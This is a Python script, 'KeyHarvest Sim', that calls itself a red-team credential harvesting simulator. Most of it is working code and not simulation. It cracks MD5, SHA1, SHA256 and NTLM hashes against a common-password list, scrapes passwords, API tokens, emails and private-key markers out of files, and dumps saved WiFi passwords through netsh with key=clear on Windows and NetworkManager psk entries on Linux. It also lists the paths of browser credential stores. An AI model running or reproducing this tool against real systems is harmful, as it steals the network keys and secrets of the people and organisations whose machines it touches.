#!/usr/bin/env python3
"""
KeyHarvest Sim - Credential Harvesting Simulation
Author: Youssef Zeidi | Red Team Specialist
Simulates credential harvesting for authorized red team training.
"""

import argparse, hashlib, json, os, re, base64
from datetime import datetime

BANNER = """
 ██╗  ██╗███████╗██╗   ██╗██╗  ██╗ █████╗ ██████╗ ██╗   ██╗███████╗███████╗████████╗
 ██║ ██╔╝██╔════╝╚██╗ ██╔╝██║  ██║██╔══██╗██╔══██╗██║   ██║██╔════╝██╔════╝╚══██╔══╝
 █████╔╝ █████╗   ╚████╔╝ ███████║███████║██████╔╝██║   ██║█████╗  ███████╗   ██║
 ██╔═██╗ ██╔══╝    ╚██╔╝  ██╔══██║██╔══██║██╔══██╗╚██╗ ██╔╝██╔══╝  ╚════██║   ██║
 ██║  ██╗███████╗   ██║   ██║  ██║██║  ██║██║  ██║ ╚████╔╝ ███████╗███████║   ██║
 ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚══════╝   ╚═╝
        Credential Harvesting Simulator v1.0 | Shadow Core Red Team
"""

# ─── Hash cracking module ───────────────────────────────────────────────
COMMON_PASSWORDS = [
    "password","123456","password1","admin","letmein","qwerty","welcome",
    "monkey","dragon","master","sunshine","princess","abc123","shadow",
    "superman","michael","football","iloveyou","trustno1","Password1",
]

def crack_md5(hash_str: str) -> str | None:
    for pw in COMMON_PASSWORDS:
        if hashlib.md5(pw.encode()).hexdigest() == hash_str.lower():
            return pw
    return None

def crack_sha1(hash_str: str) -> str | None:
    for pw in COMMON_PASSWORDS:
        if hashlib.sha1(pw.encode()).hexdigest() == hash_str.lower():
            return pw
    return None

def crack_sha256(hash_str: str) -> str | None:
    for pw in COMMON_PASSWORDS:
        if hashlib.sha256(pw.encode()).hexdigest() == hash_str.lower():
            return pw
    return None

def crack_ntlm(hash_str: str) -> str | None:
    import hashlib
    for pw in COMMON_PASSWORDS:
        ntlm = hashlib.new("md4", pw.encode("utf-16-le")).hexdigest()
        if ntlm == hash_str.lower():
            return pw
    return None

def identify_hash(h: str) -> str:
    l = len(h)
    if l == 32:
        return "MD5 or NTLM"
    elif l == 40:
        return "SHA1"
    elif l == 64:
        return "SHA256"
    elif l == 128:
        return "SHA512"
    return "Unknown"

# ─── Credential extraction from files ──────────────────────────────────
def extract_from_file(filepath: str) -> dict:
    results = {"emails": [], "hashes": [], "passwords": [], "tokens": [], "keys": []}
    try:
        with open(filepath, "r", errors="ignore") as f:
            content = f.read()
        results["emails"] = list(set(re.findall(
            r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", content)))
        results["hashes"] = list(set(re.findall(
            r"[a-fA-F0-9]{32,64}", content)))
        results["passwords"] = list(set(re.findall(
            r"(?:password|passwd|pwd|pass)\s*[=:]\s*["']?([^\s"'<>{},;]+)", content, re.I)))
        results["tokens"] = list(set(re.findall(
            r"(?:token|api_key|apikey|secret|bearer)\s*[=:]\s*["']?([a-zA-Z0-9_\-]{20,})", content, re.I)))
        results["keys"] = list(set(re.findall(
            r"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----", content)))
    except Exception as e:
        print(f"[!] Error reading {filepath}: {e}")
    return results

# ─── Browser credential simulation ─────────────────────────────────────
def simulate_browser_extract() -> list:
    """Simulate what browser credential extraction looks like (for training)"""
    simulated = [
        {"browser": "Chrome", "url": "https://example.com", "username": "user@example.com",
         "password": "[ENCRYPTED - requires DPAPI decryption on target]"},
        {"browser": "Firefox", "url": "https://admin.corp.local", "username": "admin",
         "password": "[ENCRYPTED - requires NSS key extraction]"},
    ]
    print("[*] Browser credential locations:")
    print("    Chrome : %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")
    print("    Firefox: %APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json")
    print("    Edge   : %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data")
    return simulated

# ─── WiFi credential extraction ─────────────────────────────────────────
def extract_wifi_profiles() -> list:
    import subprocess, platform
    profiles = []
    if platform.system() == "Windows":
        try:
            result = subprocess.run(
                ["netsh", "wlan", "show", "profiles"],
                capture_output=True, text=True)
            names = re.findall(r"All User Profile\s+:\s+(.+)", result.stdout)
            for name in names:
                key_result = subprocess.run(
                    ["netsh", "wlan", "show", "profile", name, "key=clear"],
                    capture_output=True, text=True)
                keys = re.findall(r"Key Content\s+:\s+(.+)", key_result.stdout)
                profiles.append({"ssid": name.strip(), "password": keys[0].strip() if keys else "N/A"})
        except Exception as e:
            print(f"[!] WiFi extraction error: {e}")
    elif platform.system() == "Linux":
        wifi_dir = "/etc/NetworkManager/system-connections/"
        if os.path.exists(wifi_dir):
            for f in os.listdir(wifi_dir):
                try:
                    with open(os.path.join(wifi_dir, f)) as fp:
                        content = fp.read()
                    ssid = re.search(r"ssid=(.+)", content)
                    psk = re.search(r"psk=(.+)", content)
                    if ssid:
                        profiles.append({
                            "ssid": ssid.group(1).strip(),
                            "password": psk.group(1).strip() if psk else "N/A"
                        })
                except:
                    pass
    return profiles

# ─── Main ────────────────────────────────────────────────────────────────
def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="KeyHarvest Sim - Credential Harvesting Trainer")
    parser.add_argument("--module", choices=["crack","extract","browser","wifi","all"], required=True)
    parser.add_argument("--hash", help="Hash to crack")
    parser.add_argument("--file", help="File to extract credentials from")
    parser.add_argument("--wordlist", help="Custom wordlist path")
    parser.add_argument("--output", default="harvest_results.json")
    args = parser.parse_args()

    results = {"timestamp": datetime.now().isoformat(), "module": args.module, "findings": {}}

    if args.module in ("crack", "all") and args.hash:
        h = args.hash.strip()
        htype = identify_hash(h)
        print(f"[*] Hash type: {htype}")
        print(f"[*] Cracking: {h}")
        crackers = {"MD5": crack_md5, "NTLM": crack_ntlm, "SHA1": crack_sha1, "SHA256": crack_sha256}
        cracked = None
        for name, fn in crackers.items():
            cracked = fn(h)
            if cracked:
                print(f"[+] CRACKED ({name}): {h} -> {cracked}")
                results["findings"]["crack"] = {"hash": h, "plaintext": cracked, "type": name}
                break
        if not cracked:
            print(f"[-] Not found in common wordlist. Try: hashcat -m 0 {h} rockyou.txt")

    if args.module in ("extract", "all") and args.file:
        print(f"[*] Extracting credentials from: {args.file}")
        found = extract_from_file(args.file)
        for k, v in found.items():
            if v:
                print(f"[+] {k}: {v}")
        results["findings"]["extract"] = found

    if args.module in ("browser", "all"):
        print(f"[*] Browser credential simulation:")
        creds = simulate_browser_extract()
        for c in creds:
            print(f"  [{c['browser']}] {c['url']} -> {c['username']}")
        results["findings"]["browser"] = creds

    if args.module in ("wifi", "all"):
        print(f"[*] Extracting WiFi credentials...")
        profiles = extract_wifi_profiles()
        if profiles:
            for p in profiles:
                print(f"  [WiFi] SSID: {p['ssid']} | Password: {p['password']}")
        else:
            print("[*] No WiFi profiles found (run on Windows/Linux with NetworkManager)")
        results["findings"]["wifi"] = profiles

    with open(args.output, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n[+] Results saved: {args.output}")

if __name__ == "__main__":
    main()
